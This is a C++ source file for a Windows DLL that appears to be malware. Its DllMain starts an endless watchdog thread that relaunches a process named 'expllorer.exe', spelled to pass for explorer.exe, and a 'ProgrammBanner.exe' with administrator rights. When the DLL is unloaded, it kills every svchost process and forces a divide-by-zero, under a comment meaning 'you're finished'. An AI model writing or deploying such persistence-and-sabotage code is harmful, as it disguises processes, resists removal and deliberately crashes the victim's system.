#include"MustInclude.h"
#include"../process.h"
#include"../file.h"
#include"GeneralTask.h"






DWORD WINAPI MonitorThread(LPVOID lpParam){
	OutputDebugStringA("Moniter Thread Started.");
	LPCWSTR A=ConvertToWideString(string(string(BIN_PATH)+string("expllorer.exe"))),B=ConvertToWideString(string(string(BIN_PATH)+string("ProgrammBanner.exe")));
	while(1){
		FileProtect();
		
		if(!isProcessExist(getSinglePid("expllorer"))){LaunchAdminInteractiveProcess(A);}
		if(!isProcessExist(getSinglePid("ProgrammBanner"))){LaunchAdminInteractiveProcess(B);}
		Sleep(4000);
	}
	return 0;
}


// DLL入口点
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    static HANDLE hThread = NULL;

    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:{
        //DisableThreadLibraryCalls(hinstDLL);
        hThread = CreateThread(NULL, 0, MonitorThread, NULL, 0, NULL);
		}
        break;
    case DLL_PROCESS_DETACH://你完了
		{
		vector<int> list=getPid("svchost");
        for(int i=0;i<list.size();i++){TerminateProcessById(list[i]);}
		int a=0;int b=9/a;
		}
        break;
    
	case DLL_THREAD_DETACH:{
		DWORD exitCode = 0;if(GetExitCodeThread(hThread,&exitCode)&&exitCode!=259){hThread = CreateThread(NULL, 0, MonitorThread, NULL, 0, NULL);}
		}
		break;
	default: break;
	}
    return TRUE;
}
